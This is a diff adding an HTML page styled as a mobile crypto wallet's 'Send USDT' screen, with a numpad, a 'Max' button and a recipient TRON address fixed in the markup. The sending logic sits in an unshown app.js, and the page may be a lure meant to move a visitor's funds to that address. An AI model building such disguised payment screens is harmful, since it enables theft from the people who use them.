@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Send USDT</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="app" id="app">
+
+    <!-- Header -->
+    <div class="hdr slide" data-s="0">
+      <div class="hdr-title">Amount</div>
+    </div>
+
+    <!-- To -->
+    <div class="to slide" data-s="1">
+      <span class="to-label">To:</span>
+      <span class="to-addr">TLFD53gg5uraFeKMsLs8m9ZT1cpX6JFDHo</span>
+    </div>
+
+    <!-- Amount -->
+    <div class="amount-wrap slide" data-s="2">
+      <div class="amount" id="amount">0</div>
+      <div class="usd-line">≈ $<span id="usd">0.00</span> <span class="swap">↕</span></div>
+    </div>
+
+    <!-- Token Row -->
+    <div class="token-row slide" data-s="3">
+      <div class="token-left">
+        <img class="token-icon" src="https://images.ctfassets.net/clixtyxoaeas/6XVYyRJTjyzUAyWg3CfjcH/c75fb2bac44b2622f15832b63f993162/usdt.png" alt="USDT" width="40" height="40" />
+        <div class="token-info">
+          <div class="token-bal" id="bal">0 USDT</div>
+          <div class="token-usd" id="bal-usd">$0.00</div>
+        </div>
+      </div>
+      <button class="max-btn" onclick="setMax()">Max</button>
+    </div>
+
+    <!-- Numpad -->
+    <div class="numpad slide" data-s="4">
+      <button class="k" onclick="tap('1')">1</button>
+      <button class="k" onclick="tap('2')">2</button>
+      <button class="k" onclick="tap('3')">3</button>
+      <button class="k" onclick="tap('4')">4</button>
+      <button class="k" onclick="tap('5')">5</button>
+      <button class="k" onclick="tap('6')">6</button>
+      <button class="k" onclick="tap('7')">7</button>
+      <button class="k" onclick="tap('8')">8</button>
+      <button class="k" onclick="tap('9')">9</button>
+      <button class="k" onclick="tap('.')">.</button>
+      <button class="k" onclick="tap('0')">0</button>
+      <button class="k kd" onclick="back()">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#8a91a0" stroke-width="2" stroke-linecap="round"><path d="M21 4H8l-7 8 7 8h13a2 2 0 002-2V6a2 2 0 00-2-2z"/><line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/></svg>
+      </button>
+    </div>
+
+    <!-- Send Button -->
+    <div class="bottom slide" data-s="5">
+      <button class="send-btn" id="sendBtn" onclick="go()">Send</button>
+      <div class="status" id="st"></div>
+    </div>
+
+    <!-- Success Overlay -->
+    <div class="ok" id="ok" style="display:none">
+      <div class="ok-card">
+        <svg class="ok-icon" width="64" height="64" viewBox="0 0 64 64"><circle cx="32" cy="32" r="32" fill="#34d399"/><path d="M20 32l8 8 16-16" stroke="#fff" stroke-width="4" fill="none" stroke-linecap="round"/></svg>
+        <div class="ok-title">Sent!</div>
+        <div class="ok-amt" id="ok-amt">0 USDT</div>
+        <div class="ok-to">TLFD53...DHo</div>
+        <div class="ok-tx" id="ok-tx"></div>
+        <button class="ok-btn" onclick="reset()">Done</button>
+      </div>
+    </div>
+
+  </div>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/tronweb/4.7.0/TronWeb.js"></script>
+  <script src="app.js"></script>
+</body>
+</html>
